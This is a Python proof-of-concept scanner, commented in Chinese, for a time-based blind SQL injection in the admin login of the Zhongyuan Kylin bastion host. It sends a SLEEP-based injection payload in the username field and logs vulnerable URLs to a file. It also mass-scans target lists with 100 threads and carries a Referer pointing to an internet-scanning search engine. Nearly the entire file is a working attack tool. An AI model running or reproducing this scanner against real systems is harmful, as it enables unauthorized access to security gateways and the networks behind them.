# 导包
import argparse,requests,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# 指纹模块
def banner():
    banner = '''

 **                          **         **        ********   *******    **      
/**                         /**        //        **//////   **/////**  /**      
/**       ******    ******  /**  *****  **      /**        **     //** /**      
/******  //////**  **////** /** **///**/**      /*********/**      /** /**      
/**///**  ******* /**   /** /**/*******/**      ////////**/**    **/** /**      
/**  /** **////** /**   /** /**/**//// /**             /**//**  // **  /**      
/****** //********//******  ***//******/**       ********  //******* **/********
/////    ////////  //////  ///  ////// //       ////////    /////// // //////// 
                                                
'''
    print(banner)
# poc模块
def poc(target):
    url = target + "/admin.php?controller=admin_commonuser"
    headers = {
        "Cookie": "PHPSESSID=4638581ea38250ea39ad8b15951634ed",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://fofa.info/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "77"
    }
    data = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.gt(\"5\") && time.lt(\"10\"))"
    }
    data1 = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.lt(\"5\")"
    }
    try:
        res = requests.get(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "result" in res.text and "username and password does not match" in res.text:
            res1 =requests.get(url=url,headers=headers,data=data1,verify=False,timeout=10)
            if res1.status_code == 200 and "result" in res.text and "username and password does not match" in res1.text:
                print("[+] 这个url存在SQL注入" + target)
                with open('zyres.txt','a',encoding='utf-8') as f:
                    f.write(target + "存在SQL注入\n")
        else:
            print("[-] 这个url不存在SQL注入")
    except:
        pass

# 主函数模块
def main():
    banner()
    '''命令行接收参数'''
    parse = argparse.ArgumentParser(description="这是中原麒麟堡垒机sql注入的poc")
    #  -u 单个检测   -f 批量检测
    parse.add_argument('-u','--url',dest='url',type=str,help="url")
    parse.add_argument('-f','--file',dest='file',type=str,help='url.txt')
    # 调用
    args = parse.parse_args()
    # 处理命令行参数的事情
    # 判断是单个的url还是txt文件
    # 如果是单个url，直接利用poc
    if args.url and not args.file:
        poc(args.url)
    # 如果是文件，定义一个空列表，将txt文件中的url按行读取到url列表中
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        # 定义线程池为100
        mp = Pool(100)
        # 将列表参数输入到poc中利用
        mp.map(poc,url_list)
        # 关闭线程池
        mp.close()
        mp.join()
    else:
        print("Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == '__main__':
    main()